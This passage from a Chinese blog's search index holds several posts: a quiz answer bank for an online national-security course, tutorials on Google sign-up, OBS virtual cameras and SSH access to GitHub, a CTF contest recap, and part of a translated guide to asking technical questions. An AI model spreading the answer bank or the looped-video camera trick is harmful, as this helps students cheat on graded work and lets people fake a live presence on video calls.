标\n2【单选题】生态系统作为一个整体，既是人类的生存空间又是人类获取生产生活资源的来源。对国家来说，要获得充分的资源不但取决于国内的生态安全，而且取决于（C）。\nA、自身生态安全\nB、人际生态安全\nC、国际和全球生态安全\nD、社会生态安全\n10.2\n1【判断题】水土流失、地下水严重超采、土壤退化、面源污染加重已成为制约农业可持续发展的突出矛盾。\n我的答案：√\n2【判断题】我国土壤污染南方重于北方，长三角珠、珠三角和东北老工业基地等部分区域土壤污染问题较为突出，西南和中南地区土壤重金属超标范围大。\n我的答案：√\n10.3\n1【单选题】严守水资源“三条红线”的“红线”不包括（D）。\nA、开发利用\nB、用水效率\nC、水功能区限制纳污\nD、运用技术处理废水\n2【判断题】生态修复是一项系统工程，短期内难以见效，应坚持绿色发展，改善生态环境。\n我的答案：√\n11.1\n1【单选题】（C）是指一个国家或地区可以保质保量、及时持续、稳定可靠、经济合理地获取所需的自然资源及资源性产品的状态或能力。\nA、原料安全\nB、源头安全\nC、资源安全\nD、材料安全\n2【单选题】资源安全包括（B）、质量、结构、均衡和经济5个基本要素。\nA、可再生\nB、数量\nC、可持续\nD、质地\n11.2\n1【单选题】现代人们认为最具有战略意义的资源，包括（A）、生物资源、水资源、土地资源、海洋资源等。\nA、矿产资源\nB、生物资源\nC、人才资源\nD、住房资源\n2【单选题】我国（B）所称土地，是指中华人民共和国各行政区域管理范围内的所有土地，按其利用类别分为农用地、建设用地和未用地。\nA、《国家安全法》\nB、《土地管理法》\nC、《宪法》\nD、《环境保护法》\n11.3\n1【单选题】当前，深圳、东莞等珠三角城市的土地开发强度都已超过国际公认的（A）警戒线。\nA、0.3\nB、0.4\nC、0.25\nD、0.35\n2【单选题】中国的缺水类型，不包括（D）。\nA、水资源总量缺乏的资源性缺水\nB、由于特殊地理地质环境及缺乏存水设施导致的工程性缺水\nC、由于排放废水等导致淡水资源污染而短缺的水质性缺水\nD、由于气候灾害引起的干旱缺水\n11.4\n1【单选题】（B）是指人类社会生产和生活中废弃可回收利用的物资。\nA、可利用资源\nB、再生资源\nC、可加工资源\nD、环保资源\n2【判断题】资源开发利用总体水平不高，是我国资源安全面临的突出问题。\n我的答案：√\n12.1\n1【单选题】1945年8月6日和9日，（D）在日本广岛和长崎投放代号为“小男孩”和“胖子”两枚原子弹，迫使日本于8月15日宣布投降。\nA、俄国\nB、英国\nC、法国\nD、美国\n2【单选题】1964年10月16日，中国第一颗原子弹在（C）的一声巨响，宣告着中国有力地打破了超级大国的核垄断和核讹诈,提高了中国的国际地位。\nA、西昌\nB、酒泉\nC、罗布泊\nD、太原\n12.2\n1【单选题】（B）又称为原子能反应堆或反应堆，是能维持可控自持链式核裂变反应，以实现核能利用的装置。\nA、堆芯\nB、核反应堆\nC、核材料\nD、原子能\n2【单选题】核电厂除了正常供电系统外，还设置有应急电源，由数台（C）发电机组和相应的供电系统组成。\nA、煤炭\nB、风能\nC、柴油\nD、潮汐\n12.3\n1【单选题】核事故是指大型核设施发生的意外事件，核事故共分为（D）级。\nA、4\nB、5\nC、6\nD、7\n2【单选题】2011年，日本福岛核电站泄漏属于核事故中的（D）级。\nA、4\nB、5\nC、6\nD、7\n12.4\n1【单选题】（A）于2014年12月19日发布了《核安全文化政策声明》，在全行业推进核安全文化建设。\nA、中国\nB、英国\nC、法国\nD、美国\n2【判断题】核事故应急管理是指在事故应急时采取的核事故对策、应急准备、应急措施及事故后恢复行动的管理活动。\n我的答案：√\n13.1\n1【单选题】（C）即指一个主权国家管辖范围之外的境外利益，也就是国家的边界和海关之外的各类利益。\nA、边界利益\nB、海关利益\nC、海外利益\nD、外国利益\n2【判断题】海外利益安全是指国家依法采取必要措施，保护海外中国公民、组织和机构的安全和正当权益，保护国家的海外利益不受威胁和侵害。\n我的答案：√\n13.2\n1【单选题】国际大环境对我国维护海外利益安全总体有利，但部分地区（D）对我国企业和公民在当地发展生存带来严峻挑战。\nA、基础设施落后\nB、住房匮乏\nC、粮食短缺\nD、局势动荡\n2【单选题】（B）是考察东道国政府稳定性和质量的重要依据，是我国海外利益扩展重要的安全因素。\nA、经济风险\nB、政治风险\nC、文化风险\nD、网络风险\n13.3\n1【单选题】“非战争军事行动”原本是一个特定称谓，在1993年（B）陆军《作战纲要》中首次提出。\nA、俄国\nB、美国\nC、英国\nD、法国\n2【判断题】面对日益复杂的国际和地区安全风险，任何国家都难以凭一己之力维护海外利益安全，同舟共济、携手合作是必然选择。\n我的答案：√\n14.1\n1【单选题】中国载人航天工程于（C）正式启动，中国已成为能够独立开展载人航天活动、掌握空间出舱活动技术的世界航天大国。\nA、1990年\nB、1991年\nC、1992年\nD、1993年\n2【判断题】外层空间、国际海底区域和极地等新型领域，可通过国际申请，专属于世界上任何一个国家。\n我的答案：X\n15.1\n1【判断题】公民和组织应当自觉履行《宪法》《国家安全法》规定的维护国家安全的法律义务。\n我的答案：√\n2【判断题】维护国家安全的根基在人民、力量在人民、血脉在人民。只有依靠人民，才能切实有力地维护国家安全。\n我的答案：√\n","categories":["技术教程"],"tags":["线上课答案库","超星学习通","国家安全教育"]},{"title":"手把手教你注册Google账号","url":"/posts/f286f4f8.html","content":"Google账号的注册教程\n本部分基于这篇文章进行编辑，致敬\n\n\n首先打开浏览器，然后进入设置把浏览器设置成英文语言，来提高成功率\n\n特别说明一下，是浏览器的总语言，在浏览器设置里，而不只是设置当前页面的语言\n\n我们使用浏览器打开谷歌邮箱官网（http://gmail.google.com/ ），进入谷歌邮箱的登录主页，我们点击左下方的创建账号按钮，选择个人用途（为我自己）\n\n\n\n在进入的界面我们不要着急填写资料，我们先修改语言，点击左下方的简体中文。这个时候，会弹出国家语言列表，我们选择“English（United States）”。\n\n\n\n这个时候，界面会变成英语。输入姓氏和名字，点击 Next\n\n\n\n选择月份、日、年、性别，点击Next\n\n\n\n选择Gmail邮箱地址，前两个是随机出的邮箱地址，可以勾选第三个自定义邮箱地址，输入邮箱地址后，点击 Next\n\n\n\n输入密码，确认密码后，点击 Next\n\n\n添加恢复电子邮件，账号异常或锁定时，Google 可以通过恢复电子邮件联系您。直接点击 Skip 跳过\n\n\n\n\n选择中国，填写自己的手机号，点击Next\n\n关于手机号无法用于验证的问题，可以看这一位大佬的帖子：https://blog.csdn.net/qaqwqaqwq/article/details/130442226#/\n这个问题与我一开始写的第一步相呼应，开头切换英文主要就是为了解决这边\n\n\n确认账户信息页面，没问题的话，点击 Next\n\n\n\n隐私条款确认，拉取到底部，点击 I agree 我同意\n\n\n\n如图，出现此界面，说明 Google 邮箱创建成果\n\n\n注：创建失败时\n\n手机号码已经注册过\n在注册时，将语言设置为英语，成功率高\n切换节点\n过会再试试\n\n","categories":["技术教程"],"tags":["手把手教程系列","Google-account"]},{"title":"手把手教你用新版OBS虚拟摄像头","url":"/posts/f885f05a.html","content":"\n本教程基于B站https://www.bilibili.com/read/cv11603378/编写\n\n零、前言说明本教程仅适用于最新版OBS，主版本号30（版本26基本与此一样）\n一、下载安装\n下载方式有两种：\n\n\n官网下载：https://obsproject.com\n服务器在国外，速度可能较慢，你可以尝试使用下面的方法下载。\n\n国内镜像：https://mirror.tuna.tsinghua.edu.cn\n清华大学TUNA镜像站，右侧栏“获取下载链接”–应用软件–OBS–选择合适的版本下载即可（注意选择那个带有“Installer”字样的，括号里是exe，那个是安装包，zip是便携版）。\n\n\n\n打开安装包，一路下一步安装就行，与普通软件安装没什么两样，安装位置任意选。\n\n\n二、OBS的简单配置打开OBS Studio软件。\n\n可以使用自动配置向导，选择最后一项“我只使用虚拟摄像机”即可。\n注：OBS 26版本无此选项，此时你应该选择“取消”\n\n\n\n之后选择“下一步”–“应用设置”\n\n（可选步骤）修改虚拟摄像头的输出大小\n在OBS主程序菜单栏左上角“文件”中，找到“设置”\n你可以在“设置”窗口的“视频”选项卡中找到输出分辨率和帧率的设置\n电脑配置较差的用户可以参考我的设置\n\n\n\n不明白各参数什么意思的可以直接照搬我的设置，或者保持默认不动。\n三、准备虚拟视频实现录制一个视频，用来虚拟化\n注意此视频将会用作虚拟视频效果\n四、编辑和启动虚拟摄像头\n回到主界面，在下方的“来源”栏下点击“+”加号，添加一个“媒体源”\n\n\n\n\n点击“浏览”，选择刚才录制好的视频文件\n\n\n选择好文件后，一定记得勾选“循环”！\n此时上方可能不会立刻出现视频的预览，点击“确定”，视频就出现了。\n如果没有视频显示在预览的画面里，尝试修改“在可用时使用硬件编码”这一选项\n注：如果想再次调出这个界面，双击“来源”栏里的“媒体源”即可。\n\n理论上的视频应该是铺满画面的，如果没有，那就右键视频的画面–变换–比例适配屏幕。\n\n\n\n下面来启动虚拟摄像头\n单击主界面右下角“控件”一栏里的“启动虚拟摄像机”\n\n\n\n五、在第三方软件里使用虚拟摄像头这里以QQ电脑版为例\n\n在QQ里找到“设置”\n\n\n\n在“视频”选项卡里找到“摄像头”，设置为“OBS Virtual Camera”\n打开预览画面\n\n\n此时上面应该能显示出你在OBS中设置好的画面，关闭设置界面即可。\n此时大功告成了，QQ视频里会循环播放你录制好的视频\n\n如果出现如下画面，请检查是否在OBS内“启动虚拟摄像机”\n\n\n\n如果卡了，没画面，则需要打开obs的设置\n\n\n\n\n改为800*600比例\n\n\n其他软件将默认摄像头设备改为“OBS Virtual Camera”即可。\n","categories":["技术教程"],"tags":["手把手教程系列","OBS"]},{"title":"扔掉你的watt toolikt！使用ssh拉取推送Github代码~","url":"/posts/4561bfdb.html","content":"前言作者在 Github 拉取代码推送代码的时候，一直使用的是 watt toolikt，在昨天尝试给服务器挂代理的时候，配置了 ssh 代理，可以实现仅需要代理 ssh 即可正常拉取推送 Github 代码，所以作者决定使用 ssh 拉取推送 Github 代码。\n此外，作者在上一篇文章中介绍了 ssh 代理脚本，请移步基于 Ed25519 算法的配置 Github SSH 的 shell 脚本 | W1ndys 小屋\n生成秘钥ssh-keygen -t ed25519 -C &quot;your_email@example.com&quot;\n\n生成一个 id_ed25519 和 id_ed25519.pub 文件，将 id_ed25519.pub 文件的内容添加到 Github 的 SSH 密钥中。\n配置 ssh 代理在 ~/.ssh/config 文件中添加以下内容：\nHost github.com    Hostname ssh.github.com    Port 443    User git\n\n测试ssh -T git@github.com\n\n如果配置成功，会看到以下内容：\nYou&#x27;ve successfully authenticated, but GitHub does not provide shell access.\n\n使用之后挂上魔法就可以使用 ssh 拉取推送 Github 代码了。无需依赖 watt toolikt\n"},{"title":"技能兴鲁2023职业技能大赛网络安全赛项比赛心得","url":"/posts/7c7bd47d.html","content":"30个队伍排名第18还行，有一个队伍弃权没来，两个队伍作弊被ban了，顺延2名，最终第16，广外和南理的师傅太强了，山警的大哥被ban了不然也是前三11月24就已经打完了，一直没来得及写心得\n可能是因为团队赛吧感觉比科来打的好点有好几个题都是差一点我交了两个简单题，逆了一个misc的pyc，也是没拖后腿misc这个题是很有意思的，压缩包有密码，可以暴力破解出来，然后三个附件，其中一个是一首诗，很有意思，但是不知道这首诗是有什么用，这题就差一点了，没做出来。发现了自己还有很多东西没学没掌握好，re的花指令，动态调试，老东西直接秒了的题，我不会\n见到了西邮的师傅\n另外说一下对组委会的印象评价是一坨稀烂连个纪念品都没有，也没手提包，整场下来就给个参赛证，然后报告厅像个教室，甚至还不如我们的教室大（进赛场之后桌子上一人一份伙食（一包奶一个面包一根火腿肠，我的天我们还以为这是早饭，没想到这是午饭）中途上了一遍零食（好丽友＋一根火腿肠）爆笑如雷了，在济南都是组委包吃住，酒店随便吃的还有更抽象的上午10:30开赛，到时间准时开赛准时断电，布置赛场也偷工减料了吧，供电不足直接断电了，抢修了一个小时导致比赛延后了然后中途上了一次电，信号屏蔽仪直接嘎嘣冒烟，当场炸了，还有好几位师傅的电源适配器给烧了（byd这才是应急响应是吧\n这也是裁判长最忙的一次，山警大哥应该是比赛过程中询问wp，说的很含糊然后就ban了，还有带手机被听见了，但是没被逮住，辗优就在我隔壁，很强的一个热点信号\n三等奖，也算是没白来，威海那个去了大概能拿个一等，他们组委举办的也还行，就是路费太高了，没奖金没报销总的来说还是得练，师傅们觉得一把梭的题我要搞半天\n","categories":["CTF","比赛心得","省赛"],"tags":["CTF","技能兴鲁"]},{"title":"操作系统实验1——L1 什么是操作系统","url":"/posts/d77eff50.html","content":"L1 什么是操作系统tmd 这个系统我都卡的我不想说什么了，比我吃 s 都难受\n实验环境的工作模式\n使用方法\n编译内核\n调试\n\n文件交换系统好卡\n\n\n\n","categories":["QFNU","操作系统","实验报告"],"tags":["QFNU","操作系统"]},{"title":"提问的智慧","url":"/posts/fb3832f5.html","content":"提问的智慧How To Ask Questions The Smart Way\nCopyright © 2001,2006,2014 Eric S. Raymond, Rick Moen 本指南英文版版权为 Eric S. Raymond, Rick Moen 所有。\n原文网址:http://www.catb.org/~esr/faqs/smart-questions.html\nCopyleft 2001 by D.H.Grand(nOBODY&#x2F;Ginux), 2010 by Gasolin, 2015 by Ryan Wu 本中文指南是基于原文 3.10 版以及 2010 年由 Gasolin 所翻译版本的最新翻译；协助指出翻译问题，请发Issue，或直接发Pull Request给我。\n本文另有简体中文版: https://github.com/FredWe/How-To-Ask-Questions-The-Smart-Way/blob/master/README-zh_CN.mdWay/blob/master/README-zh_CN.md\n原文版本历史\n目录\n 声明\n\n 简介\n\n 在提问之前\n\n 当你提问时\n\n 慎选提问的论坛\n\n 网站和IRC论坛\n\n 第二步，使用项目邮件列表\n\n 使用有意义且描述明确的标题\n\n 使问题容易回复\n\n用清晰、正确、精准并合法语法的语句\n\n 使用易于读取且标准的文件格式发送问题\n\n 精确的描述问题并言之有物\n\n 话不在多而在精\n\n 别动辄声称找到Bug\n\n 可以低声下气，但还是要先做功课\n\n 描述问题症状而非猜测\n\n 按发生时间先后列出问题症状\n\n 描述目标而不是过程\n\n 别要求使用私人电邮回复\n\n 清楚明确的表达你的问题以及需求\n\n 询问有关代码的问题时\n\n 别把自己家庭作业的问题贴上来\n\n 去掉无意义的提问句\n\n 即使你很急也不要在标题写紧急\n\n 礼多人不怪，而且有时还很有帮助\n\n 问题解决后，加个简短的补充说明\n\n\n\n 如何解读答案\n\n RTFM和STFW：如何知道你已完全搞砸了\n\n 如果还是搞不懂\n\n 处理无礼的回应\n\n\n\n 如何避免扮演失败者\n\n 不该问的问题\n\n 好问题与蠢问题\n\n 如果得不到回答\n\n 如何更好地回答问题\n\n 相关资源\n\n 鸣谢\n\n\n声明许多项目在他们的使用协助&#x2F;说明网页中链接了本指南，这么做很好，我们也鼓励大家都这么做。但如果你是负责管理这个项目网页的人，请在超链接附近的显着位置上注明：\n本指南不提供此项目的实际支持服务！\n我们已经深刻领教到少了上述声明所带来的痛苦。因为少了这点声明，我们不停地被一些白痴纠缠。这些白痴认为既然我们发布了这本指南，那么我们就有责任解决世上所有的技术问题。\n如果你是因为需要某些协助而正在阅读这本指南，并且最后离开是因为发现从本指南作者们身上得不到直接的协助，那么你就是我们所说的那些白痴之一。别问我们问题，我们只会忽略你。我们在这本指南中是教你如何从那些真正懂得你所遇到软件或硬件问题的人取得协助，而99%的情况下那不会是我们。除非你确定本指南的作者之一刚好是你所遇到的问题领域的专家，否则请不要打扰我们，这样大家都会开心一点。\n简介在黑客的世界里，当你拋出一个技术问题时，最终是否能得到有用的回答，往往取决于你所提问和追问的方式。本指南将教你如何正确的提问以获得你满意的答案。\n不只是黑客，现在开放源代码（Open Source）软件已经相当盛行，你常常也可以由其他有经验的使用者身上得到好答案，这是件好事 ；使用者比起黑客来，往往对那些新手常遇到的问题更宽容一些。然而，将有经验的使用者视为黑客，并采用本指南所提的方法与他们沟通，同样也是能从他们身上得到满意回答的最有效方式。\n首先你应该明白，黑客们喜爱有挑战性的问题，或者能激发我们思维的好问题。如果我们并非如此，那我们也不会成为你想询问的对象。如果你给了我们一个值得反复咀嚼玩味的好问题，我们自会对你感激不尽。好问题是激励，是厚礼。好问题可以提高我们的理解力，而且通常会暴露我们以前从没意识到或者思考过的问题。对黑客而言，”好问题！”是诚挚的大力称赞。\n尽管如此，黑客们有着蔑视或傲慢面对简单问题的坏名声，这有时让我们看起来对新手、无知者似乎较有敌意，但其实不是那样的。\n我们不讳言我们对那些不愿思考、或者在发问前不做他们该做的事的人的蔑视。那些人是时间杀手 -– 他们只想索取，从不付出，消耗我们可用在更有趣的问题或更值得回答的人身上的时间。我们称这样的人为 失败者（撸瑟） （由于历史原因，我们有时把它拼作 lusers ）。\n我们意识到许多人只是想使用我们写的软件，他们对学习技术细节没有兴趣。对大多数人而言，电脑只是种工具，是种达到目的的手段而已。他们有自己的生活并且有更要紧的事要做。我们了解这点，也从不指望每个人都对这些让我们着迷的技术问题感兴趣。尽管如此，我们回答问题的风格是指向那些真正对此有兴趣并愿意主动参与解决问题的人，这一点不会变，也不该变。如果连这都变了，我们就是在降低做自己最擅长的事情上的效率。\n我们（在很大程度上）是自愿的，从繁忙的生活中抽出时间来解答疑惑，而且时常被提问淹没。所以我们无情的滤掉一些话题，特别是拋弃那些看起来像失败者的家伙，以便更高效的利用时间来回答赢家（winner）的问题。\n如果你厌恶我们的态度，高高在上，或过于傲慢，不妨也设身处地想想。我们并没有要求你向我们屈服 -\n- 事实上，我们大多数人非常乐意与你平等地交流，只要你付出小小努力来满足基本要求，我们就会欢迎你加入我们的文化。但让我们帮助那些不愿意帮助自己的人是没有效率的。无知没有关系，但装白痴就是不行。\n所以，你不必在技术上很在行才能吸引我们的注意，但你必须表现出能引导你变得在行的特质 – 机敏、有想法、善于观察、乐于主动参与解决问题。如果你做不到这些使你与众不同的事情，我们建议你花点钱找家商业公司签个技术支持服务合同，而不是要求黑客个人无偿地帮助你。\n如果你决定向我们求助，当然你也不希望被视为失败者，更不愿成为失败者中的一员。能立刻得到快速并有效答案的最好方法，就是像赢家那样提问 – 聪明、自信、有解决问题的思路，只是偶尔在特定的问题上需要获得一点帮助。\n（欢迎对本指南提出改进意见。你可以 email 你的建议至 &#101;&#x73;&#114;&#x40;&#x74;&#x68;&#x79;&#114;&#x73;&#x75;&#115;&#46;&#99;&#111;&#109; 或&#x72;&#101;&#115;&#x70;&#111;&#x6e;&#100;&#x2d;&#97;&#x75;&#x74;&#111;&#x40;&#x6c;&#x69;&#x6e;&#x75;&#x78;&#x6d;&#97;&#102;&#105;&#97;&#46;&#x63;&#x6f;&#x6d;。然而请注意，本文并非网络礼节的通用指南，而我们通常会拒绝无助于在技术论坛得到有用答案的建议。）\n在提问之前在你准备要通过电子邮件、新闻群组或者聊天室提出技术问题前，请先做到以下事情：\n\n   尝试在你准备提问的论坛的旧文章中搜索答案。\n\n   尝试上网搜索以找到答案。\n\n   尝试阅读手册以找到答案。\n\n   尝试阅读常见问题文件（FAQ）以找到答案。\n\n   尝试自己检查或试验以找到答案\n\n   向你身边的强者朋友打听以找到答案。\n\n   如果你是程序开发者，请尝试阅读源代码以找到答案\n\n\n当你提出问题的时候，请先表明你已经做了上述的努力；这将有助于树立你并不是一个不劳而获且浪费别人的时间的提问者。如果你能一并表达在做了上述努力的过程中所学到的东西会更好，因为我们更乐于回答那些表现出能从答案中学习的人的问题。\n运用某些策略，比如先用Google搜索你所遇到的各种错误信息（既搜索Google论坛，也搜索网页），这样很可能直接就找到了能解决问题的文件或邮件列表线索。即使没有结果，在邮件列表或新闻组寻求帮助时加上一句我在Google中搜过下列句子但没有找到什么有用的东西 也是件好事，即使它只是表明了搜索引擎不能提供哪些帮助。这么做（加上搜索过的字串）也让遇到相似问题的其他人能被搜索引擎引导到你的提问来。\n别着急，不要指望几秒钟的Google搜索就能解决一个复杂的问题。在向专家求助之前，再阅读一下常见问题文件（FAQ）、放轻松、坐舒服一些，再花点时间思考一下这个问题。相信我们，他们能从你的提问看出你做了多少阅读与思考，如果你是有备而来，将更有可能得到解答。不要将所有问题一股脑拋出，只因你的第一次搜索没有找到答案（或者找到太多答案）。\n准备好你的问题，再将问题仔细的思考过一遍，因为草率的发问只能得到草率的回答，或者根本得不到任何答案。越是能表现出在寻求帮助前你为解决问题所付出的努力，你越有可能得到实质性的帮助。\n小心别问错了问题。如果你的问题基于错误的假设，某个普通黑客（J. Random Hacker）多半会一边在心里想着蠢问题… ， 一边用无意义的字面解释来答复你，希望着你会从问题的回答（而非你想得到的答案）中汲取教训。\n绝不要自以为够格得到答案，你没有；你并没有。毕竟你没有为这种服务支付任何报酬。你将会是自己去挣到一个答案，靠提出有内涵的、有趣的、有思维激励作用的问题 –一个有潜力能贡献社区经验的问题，而不仅仅是被动的从他人处索取知识。\n另一方面，表明你愿意在找答案的过程中做点什么是一个非常好的开端。 谁能给点提示？ 、 我的这个例子里缺了什么？ 以及我应该检查什么地方比请把我需要的确切的过程贴出来更容易得到答复。因为你表现出只要有人能指个正确方向，你就有完成它的能力和决心。\n当你提问时慎选提问的论坛小心选择你要提问的场合。如果你做了下述的事情，你很可能被忽略掉或者被看作失败者：\n\n在与主题不合的论坛上贴出你的问题\n\n在探讨进阶技术问题的论坛张贴非常初级的问题；反之亦然\n\n在太多的不同新闻群组上重复转贴同样的问题（cross-post）\n\n向既非熟人也没有义务解决你问题的人发送私人电邮\n\n\n黑客会剔除掉那些搞错场合的问题，以保护他们沟通的渠道不被无关的东西淹没。你不会想让这种事发 生在自己身上的。\n因此，第一步是找到对的论坛。再说一次，Google和其它搜索引擎还是你的朋友，用它们来找到与你遭 遇到困难的软硬件问题最相关的网站。通常那儿都有常见问题（FAQ）、邮件列表及相关说明文件的链 接。如果你的努力（包括阅读FAQ）都没有结果，网站上也许还有报告Bug（Bug-reporting）的流程或 链接，如果是这样，连过去看看。\n向陌生的人或论坛发送邮件最可能是风险最大的事情。举例来说，别假设一个提供丰富内容的网页的作 者会想充当你的免费顾问。不要对你的问题是否会受到欢迎做太乐观的估计 – 如果你不确定，那就向别 处发送，或者压根别发。\n在选择论坛、新闻群组或邮件列表时，别太相信名字，先看看FAQ或者许可书以弄清楚你的问题是否切 题。发文前先翻翻已有的话题，这样可以让你感受一下那里的文化。事实上，事先在新闻组或邮件列表 的历史记录中搜索与你问题相关的关键词是个极好的主意，也许这样就找到答案了。即使没有，也能帮 助你归纳出更好的问题。\n别像机关枪似的一次”扫射”所有的帮助渠道，这就像大喊大叫一样会使人不快。要一个一个地来。 \n搞清楚你的主题！最典型的错误之一是在某种致力于跨平台可移植的语言、套件或工具的论坛中提关于 Unix或Windows操作系统程序界面的问题。如果你不明白为什么这是大错，最好在搞清楚这之间差异之 前什么也别问。\n一般来说，在仔细挑选的公共论坛中提问，会比在私有论坛中提同样的问题更容易得到有用的回答。有 几个理由可以支持这点，一是看潜在的回复者有多少，二是看观众有多少。黑客较愿意回答那些能帮助 到许多人的问题。\n可以理解的是，老练的黑客和一些热门软件的作者正在接受过多的错发信息。就像那根最后压垮骆驼背 的稻草一样，你的加入也有可能使情况走向极端 – 已经好几次了，一些热门软件的作者从自己软件的支 持中抽身出来，因为伴随而来涌入其私人邮箱的无用邮件变得无法忍受。\nStack Overflow搜索，然后 在 Stack Exchange 问。\n近年来，Stack Exchange community 社区已经成为回答技术及其他问题的主要渠道，尤其是那些开放 源码的项目。\n因为 Google 索引是即时的，在看 Stack Exchange 之前先在 Google 搜索。有很高的机率某人已经问了 一个类似的问题，而且 Stack Exchange 网站们往往会是搜索结果中最前面几个。如果你在 Google 上没 有找到任何答案，你再到特定相关主题的网站去找。用标签（Tag）搜索能让你更缩小你的搜索结果。\nStack Exchange 已经成长到超过一百个网站，以下是最常用的几个站：\n\nSuper User 是问一些通用的电脑问题，如果你的问题跟代码或是写程序无关，只是一些网络连线 之类的，请到这里。 \n\nStack Overflow 是问写程序有关的问题。 \n\nServer Fault 是问服务器和网管相关的问题。\n\n\n网站和IRC论坛本地的使用者群组（user group），或者你所用的 Linux 发行版本也许正在宣传他们的网页论坛或 IRC 频道，并提供新手帮助（在一些非英语国家，新手论坛很可能还是邮件列表）， 这些地方是开始提问的 好首选，特别是当你觉得遇到的也许只是相对简单或者很普通的问题时。经过宣传的 IRC 频道是公开欢 迎提问的地方，通常可以即时得到回应。\n事实上，如果程序出的问题只发生在特定 Linux 发行版提供的版本（这很常见），最好先去该发行版的 论坛或邮件列表中提问，再到程序本身的论坛或邮件列表提问。（否则）该项目的黑客可能仅仅回复 “用我们的版本”。\n在任何论坛发文以前，先确认一下有没有搜索功能。如果有，就试着搜索一下问题的几个关键词，也许 这会有帮助。如果在此之前你已做过通用的网页搜索（你也该这样做），还是再搜索一下论坛，搜索引 擎有可能没来得及索引此论坛的全部内容。\n通过论坛或 IRC 频道来提供使用者支持服务有增长的趋势，电子邮件则大多为项目开发者间的交流而保 留。所以最好先在论坛或 IRC 中寻求与该项目相关的协助。\n第二步，使用项目邮件列表当某个项目提供开发者邮件列表时，要向列表而不是其中的个别成员提问，即使你确信他能最好地回答 你的问题。查一查项目的文件和首页，找到项目的邮件列表并使用它。有几个很好的理由支持我们采用 这种办法：\n\n任何好到需要向个别开发者提出的问题，也将对整个项目群组有益。反之，如果你认为自己的问题 对整个项目群组来说太愚蠢，也不能成为骚扰个别开发者的理由。\n\n向列表提问可以分散开发者的负担，个别开发者（尤其是项目领导人）也许太忙以至于没法回答你的问题。\n\n大多数邮件列表都会被存档，那些被存档的内容将被搜索引擎索引。如果你向列表提问并得到解答，将来其它人可以通过网页搜索找到你的问题和答案，也就不用再次发问了。\n\n如果某些问题经常被问到，开发者可以利用此信息来改进说明文件或软件本身，以使其更清楚。如果只是私下提问，就没有人能看到最常见问题的完整场景。\n\n\n如果一个项目既有”使用者” 也有”开发者”（或”黑客”）邮件列表或论坛，而你又不会动到那些源代码，那么就向”使用者”列表或论坛提问。不要假设自己会在开发者列表中受到欢迎，那些人多半会将你的提问视为干扰他们开发的噪音。\n然而，如果你确信你的问题很特别，而且在”使用者” 列表或论坛中几天都没有回复，可以试试前往”开发 者”列表或论坛发问。建议你在张贴前最好先暗地里观察几天以了解那里的行事方式（事实上这是参与任 何私有或半私有列表的好主意）\n如果你找不到一个项目的邮件列表，而只能查到项目维护者的电子邮件地址，尽管向他发信。即使是在 这种情况下，也别假设（项目）邮件列表不存在。在你的电子邮件中，请陈述你已经试过但没有找到合 适的邮件列表，也提及你不反对将自己的邮件转发给他人（许多人认为，即使没什么秘密，私人电子邮 件也不应该被公开。通过允许将你的电子邮件转发他人，你给了相应人员处置你邮件的选择）。\n使用有意义且描述明确的标题在邮件列表、新闻群组或论坛中，大约50字以内的标题是抓住资深专家注意力的好机会。别用喋喋不休的帮帮忙、跪求 、急 （更别说救命啊！！！！这样让人反感的话，用这种标题会被条件反射式地忽略） 来浪费这个机会。不要妄想用你的痛苦程度来打动我们，而是在这点空间中使用极简单扼要的描述方式 来提出问题。\n一个好标题范例是目标 -- 差异式的描述，许多技术支持组织就是这样做的。在目标部分指出是哪一个 或哪一组东西有问题，在差异部分则描述与期望的行为不一致的地方。\n\n蠢问题：救命啊！我的笔电不能正常显示了！ \n\n\n聪明问题：X.org 6.8.1的鼠标游标会变形，某牌显卡 MV1005 芯片组。\n\n\n 更聪明问题：X.org 6.8.1的鼠标游标，在某牌显卡 MV1005 芯片组环境下 - 会变形。\n\n编写目标 -- 差异式描述的过程有助于你组织对问题的细緻思考。是什么被影响了？ 仅仅是鼠标游标或 者还有其它图形？只在 X.org 的 X 版中出现？或只是出现在6.8.1版中？ 是针对某牌显卡芯片组？或者只 是其中的 MV1005 型号？ 一个黑客只需瞄一眼就能够立即明白你的环境和你遇到的问题。\n总而言之，请想像一下你正在一个只显示标题的存档讨论串（Thread）索引中查寻。让你的标题更好地 反映问题，可使下一个搜索类似问题的人能够关注这个讨论串，而不用再次提问相同的问题。\n如果你想在回复中提出问题，记得要修改内容标题，以表明你是在问一个问题， 一个看起来像Re: 测试或者Re: 新bug的标题很难引起足够重视。另外，在不影响连贯性之下，适当引用并删减前文的内 容，能给新来的读者留下线索。\n对于讨论串，不要直接点击回复来开始一个全新的讨论串，这将限制你的观众。因为有些邮件阅读程 序，比如 mutt ，允许使用者按讨论串排序并通过折叠讨论串来隐藏消息，这样做的人永远看不到你发 的消息。\n仅仅改变标题还不够。mutt 和其它一些邮件阅读程序还会检查邮件标题以外的其它信息，以便为其指定 讨论串。所以宁可发一个全新的邮件。\n在网页论坛上，好的提问方式稍有不同，因为讨论串与特定的信息紧密结合，并且通常在讨论串外就看 不到里面的内容，故通过回复提问，而非改变标题是可接受的。不是所有论坛都允许在回复中出现分离 的标题，而且这样做了基本上没有人会去看。不过，通过回复提问，这本身就是暧昧的做法，因为它们 只会被正在查看该标题的人读到。所以，除非你只想在该讨论串当前活跃的人群中提问，不然还是另起炉灶比较好。\n使问题容易回复以**请将你的回复寄到**…… 来结束你的问题多半会使你得不到回答。如果你觉得花几秒钟在邮件客户端设置一下回复地址都麻烦，我们也觉得花几秒钟思考你的问题更麻烦。如果你的邮件程序不支持这样做，换个好点的；如果是操作系统不支持这种邮件程序，也换个好点的。\n在论坛，要求通过电子邮件回复是非常无礼的，除非你相信回复的信息可能比较敏感（而且有人会为了某些未知的原因，只让你而不是整个论坛知道答案）。如果你只是想在有人回复讨论串时得到电子邮件提醒，可以要求网页论坛发送给你。几乎所有论坛都支持诸如追踪此讨论串、有回复时发送邮件提醒等功能。\n用清晰、正确、精准并语法正确的语句我们从经验中发现，粗心的提问者通常也会粗心的写程序与思考（我敢打包票）。回答粗心大意者的问 题很不值得，我们宁愿把时间耗在别处。\n正确的拼字、标点符号和大小写是很重要的。一般来说，如果你觉得这样做很麻烦，不想在乎这些，那 我们也觉得麻烦，不想在乎你的提问。花点额外的精力斟酌一下字句，用不着太僵硬与正式 – 事实上， 黑客文化很看重能准确地使用非正式、俚语和幽默的语句。但它必须很准确，而且有迹象表明你是在思 考和关注问题。\n正确地拼写、使用标点和大小写，不要将 its 混淆为 it&#39;s ，loose搞成lose或者将 discrete 弄成 discreet 